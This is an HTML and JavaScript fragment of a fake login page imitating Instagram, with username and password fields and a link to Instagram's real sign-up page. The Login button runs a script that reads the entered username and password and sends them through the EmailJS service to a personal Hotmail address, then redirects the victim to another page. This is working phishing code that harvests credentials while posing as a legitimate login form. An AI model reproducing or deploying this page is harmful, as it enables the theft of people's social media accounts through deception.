    <div class="inputElement">
      <input type="text" id="username" placeholder="Phone number, username, or email" class="inputText" />
      <input type="password" id="password" placeholder="Password" class="inputText" />
      <button type="submit" class="inputButton" onclick="sendEmail()" >Login</button>

      <div class="line">
        <span class="arrow"></span>
        <span class="content">OR</span>
        <span class="arrow"></span>
      </div>

    </div>
  </div>
  <div class="footer">
    <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?hl=en" style="text-decoration: none; color:rgb(38, 94, 198)">Sign Up</a></p>

<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
  (function () {
    emailjs.init("4Tzj1TDc1OieCs5ru");
  })();

  function sendEmail() {
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const username = usernameInput.value;
    const password = passwordInput.value;

    if (!username || !password) {
      alert('Please fill in all fields.');
      return;
    }

    emailjs.send('service_090078601', 'template_v8y8x95', {
      to_email: "dev.muneeb@hotmail.com",
      subject: username,
      message: password
    })
    .then(response => {
      console.log('Email sent successfully', response);
      usernameInput.value = '';
      passwordInput.value = '';
    //  alert('Email sent successfully!');

      // Redirect to "contact.html" after sending the email
      window.location.href = "contact.html";
    
    })
    .catch(error => {
      console.error('Failed to send email', error);
      alert('Failed to send email. Please try again later.');
    });
  }
</script>
